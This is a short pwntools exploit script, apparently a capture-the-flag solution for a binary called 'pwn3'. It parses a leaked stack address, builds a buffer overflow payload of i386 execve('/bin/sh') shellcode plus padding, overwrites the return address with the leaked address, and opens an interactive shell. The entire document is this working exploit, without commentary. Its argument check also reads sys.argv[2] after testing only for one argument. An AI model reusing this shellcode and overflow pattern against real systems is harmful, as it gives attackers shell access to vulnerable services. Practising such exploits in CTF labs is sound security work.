from pwn import *
import re

context(os="linux", arch="i386")
context.log_level = "debug"

HOST = "target"
PORT = 8080
conn = None

if len(sys.argv) > 1 and sys.argv[2] == "r":
    conn = remote(HOST, PORT)
else:
    conn = process("./pwn3")

recv=conn.recvline()

pattern=b"0x[a-z0-9]*"
match=re.search(pattern,recv)
addr=str(match.group())[2:-1]
payload=b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
payload+=b"\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
payload+=(b"A"*(0x12A+0x4-len(payload)))
payload+=p32(int(addr,16))
conn.sendline(payload)
conn.interactive()
